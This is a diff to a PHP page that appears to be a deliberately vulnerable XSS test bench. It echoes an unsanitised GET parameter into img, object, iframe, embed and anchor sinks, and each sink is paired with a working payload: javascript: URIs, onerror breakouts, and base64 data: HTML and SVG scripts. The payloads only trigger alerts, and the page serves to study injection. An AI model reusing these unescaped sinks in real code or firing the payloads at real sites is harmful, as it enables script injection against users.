@@ -3,6 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="style.css" />
   <title>XSS Test Cases</title>
 </head>
 <body>
@@ -18,71 +19,108 @@
       <?php
         $userInput = isset($_GET['input']) ? $_GET['input'] : '';
 
-        echo "<h2>XSS Payloads</h2><br>";
+        echo "<h2>XSS Payloads</h2><br><hr>";
 
-        // 1. <img> with different protocols
+
+        echo "<p> <strong>1. a href with mailto:\$userInput url scheme written inside</strong></p><br>";
+        //someone@example.com?subject=Hello&body=><script>alert('XSS')</script>
+        echo "<p> </p>
+        <a href=mailto:\"$userInput\">Enter target email. Then click here to send your email</a>
+        <hr>
+        <br>";
+
+
         echo "<p><strong>IMG Tag with javascript protocol, payload:</strong> x\" onerror=\"javascript:alert('xss')</p>
         <br>";
+        //x" onerror="javascript:alert('xss')
         echo "<p><img src=\"".$userInput."\"></p>
         <br>
         <hr>";
 
+        
+        echo "<p><strong>object data=\$userInput exploited with:</strong> `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`</p>
+        <hr>
+        <br>";
         //data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
-        echo "<object data=\"" . $userInput . "\"></object>";
+        echo "<object data=$userInput></object>";
         
 
-        // echo "<p><strong>IMG Tag with data:text/html protocol, payload:</strong> data:text/html;base64," . base64_encode("<img src='x' onerror='alert(\"xss\")'>") . "</p>
-        // <br>";
-        // //echo "<p><img src=\"data:text/html;base64," . base64_encode($userInput) . "\"></p>
-        // //use alt and url/html encoding maybe
-        // echo "<p><img src=\"" . ($userInput) . "\"></p>
-        // <br>
-        // <hr>";
+        echo "<p><strong>object type=\$userInput exploited with:</strong> `REDACTED` (because it breaks the page, check index.php source code)
+        <hr>
+        <br>";
+        //image/svg+xml"><svg onload="alert('XSS')
+        echo "<object type=\"" . $userInput . "\"></object>";
 
-        // echo "<p><strong>IMG Tag with http protocol, payload:</strong> http://example.com/xss</p>
-        // <br>";
 
-        // echo "<p><img src=\"http://example.com/" . $userInput . "\"></p>
-        // <hr>
-        // <br>";
 
-        // // 2. <a> with different protocols
-        // echo "<p><strong>A Tag with javascript protocol, payload:</strong> javascript:alert('xss')</p>
-        // <br>";
- 
-        // echo "<p><a href=\"" . $userInput . "\">Click me</a></p>
-        // <hr>
-        // <br>";
 
-        // echo "<p><strong>A Tag with data:text/html protocol, payload:</strong> data:text/html;base64," . base64_encode("javascript:alert('xss')") . "</p>
-        // <br>";
+        echo "<p><strong>iframe src=\$userInput exploited with:</strong> `javascript:alert('xss')`</p>
+        <hr>
+        <br>";
+        // //javascript:alert('xss')
+        // //^^^^ hepsinde calisiyo url encoding falan yapmak lazim.
+        // echo "<iframe src=\"" . $userInput . "\"></iframe>";
 
-        // echo "<p><a href=\"data:text/html;base64," . base64_encode($userInput) . "\">Click me</a></p>
-        // <hr>
-        // <br>";
 
-        // echo "<p><strong>A Tag with http protocol, payload:</strong> http://example.com/xss</p>
-        // <br>";
+        echo "<p><strong>iframe src=\$userInput exploited with:</strong> `data:text/html;base64,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==`</p>
+        <hr>
+        <br>";
+        //data:text/html;base64,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==
+        echo "<iframe src=\"" . $userInput . "\"></iframe>";
 
-        // echo "<p><a href=\"http://example.com/" . $userInput . "\">Click me</a></p>
-        // <hr>
-        // <br>";
 
+        echo "<p><strong>iframe src=\$userInput exploited with:</strong> `data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoJ1hTUycpPC9zY3JpcHQ+PC9zdmc+`</p>
+        <hr>
+        <br>";
+        //data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoJ1hTUycpPC9zY3JpcHQ+PC9zdmc+
+        //^^^^ creates svg tag inside
+        echo "<iframe src=\"" . $userInput . "\"></iframe>";
+        
+
+
+        # data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
+        echo "<p><strong>embed data:image/svg+xml;base64,PHN2Z</strong></p>
+        <embed src=\"" . $userInput . "\"></embed>
+        <hr>
+        <br>";
+
+
+  
+        # data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+        // base64 encode : <script>alert('XSS')</script>
+        echo "<p><strong>embed data:text/html;base64,PHNj...</strong></p>
+        <embed src=\"$userInput\"></embed>
+        <hr>
+        <br>";
+        
+
+
+        // data:text/html;base64,amF2YXNjcmlwdDphbGVydCgp" onload="eval(atob(this.src.split(',')[1]))">
+        // base64 encode : javascript:alert()
+        echo "<p><strong>data:text/html;base64,amF2YX...</strong></p>
+        <embed src=\"$userInput\"></embed>
+        <hr>
+        <br>";
+
+
+
+        
+        echo "<p><strong>a href=\$userInput exploited with </strong>`javascript:alert('xss')`</p><br><p>Has to be clicked.</p>
+        <br>";
+        //javascript:alert(1)
+        echo "<p></p>
+        <a href=\"$userInput\">LINK</a>
+        <hr>
+        <br>";
+
+
+
+
+
+
+
+        //lanet olasi deneyler asagida
         // // 3. <svg> with different protocols
-        // echo "<p><strong>SVG Tag with javascript protocol, payload:</strong> javascript:alert('xss')</p>
-        // <br>";
-
-        // echo "<p><svg height=\"" . $userInput . "\" width=\"100\" xmlns=\"http://www.w3.org/2000/svg\"><circle r=\"45\" cx=\"50\" cy=\"50\" stroke=\"green\" stroke-width=\"3\" fill=\"red\" /></svg></p>
-        // <hr>
-        // <br>";
-
-        // echo "<p><strong>SVG Tag with data:text/html protocol, payload:</strong> data:text/html;base64," . base64_encode("<svg onload='alert(\"xss\")'>") . "</p>
-        // <br>";
-
-        // echo "<p><svg height=\"100\" width=\"100\"><circle r=\"" . $userInput . "\" cx=\"50\" cy=\"50\" stroke=\"green\" stroke-width=\"3\" fill=\"red\" /></svg></p>
-        // <hr>
-        // <br>";
-
         // echo "<p><strong>SVG Tag with http protocol, payload:</strong> http://example.com/xss</p>
         // <br>";
 
@@ -99,6 +137,7 @@
         // echo "<p><body onMouseOver=\"" . $userInput . "\"></body></p>
         // <hr>
         // <br>";
+        
       ?>
     </div>
   </div>
